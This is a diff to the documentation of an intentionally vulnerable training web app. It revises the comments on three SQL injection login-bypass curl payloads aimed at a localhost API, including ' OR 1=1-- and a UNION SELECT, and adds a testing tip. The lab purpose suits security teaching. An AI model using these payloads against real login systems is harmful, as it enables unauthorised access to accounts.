@@ -26,23 +26,23 @@ These vulnerabilities are **INTENTIONALLY INTRODUCED** for cybersecurity educati
 
 **Exploitation Examples:**
 ```bash
-# Bypass authentication completely
+# Bypass authentication completely (logs in as regular user, not admin)
 curl -X POST http://localhost:5001/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": "' OR 1=1--", "password": "anything"}'
 
-# Login as specific user (admin)
+# Login bypass with different patterns (logs in as regular user, not admin)
 curl -X POST http://localhost:5001/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": "admin'--", "password": "anything"}'
 
-# Union injection to create fake admin user
+# Union injection bypass (logs in as regular user, not admin)
 curl -X POST http://localhost:5001/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": "' UNION SELECT 1,'admin','admin'--", "password": "anything"}'
 ```
 
-**Impact:** Complete authentication bypass, potential for privilege escalation.
+**Impact:** Authentication bypass that grants access as a regular user (customer role), demonstrating SQL injection vulnerability without escalating to admin privileges.
 
 ### 2. Role Escalation via Parameters (HIGH)
 
@@ -136,6 +136,7 @@ curl -X POST http://localhost:5001/api/admin/user/1/delete
 1. **Test SQL Injection:**
    - Use the login form with SQL injection payloads
    - Try: `username: ' OR 1=1--`, `password: anything`
+   - You should be logged in as a regular user (customer role), not admin
 
 2. **Test Role Escalation:**
    - Use browser dev tools to modify API requests
